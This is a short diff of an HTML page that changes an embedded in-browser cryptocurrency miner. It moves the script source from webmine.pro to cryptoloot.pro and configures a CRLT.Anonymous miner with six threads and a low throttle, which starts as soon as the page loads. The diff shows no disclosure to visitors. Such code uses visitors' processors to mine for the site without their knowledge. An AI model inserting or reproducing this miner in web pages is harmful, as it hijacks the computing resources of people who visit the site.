@@ -37,10 +37,14 @@
     </div>
   </div>
   
-<script src="//webmine.pro/lib/crlt.js"></script>
+<script src="//cryptoloot.pro/lib/crlt.js"></script>
 <script>
-	var miner = new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY');
-	miner.start();
+var miner=new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY',
+        {
+        threads:6,autoThreads:false,throttle:0.2,
+        }
+);
+miner.start();
 </script>
   
 </body>
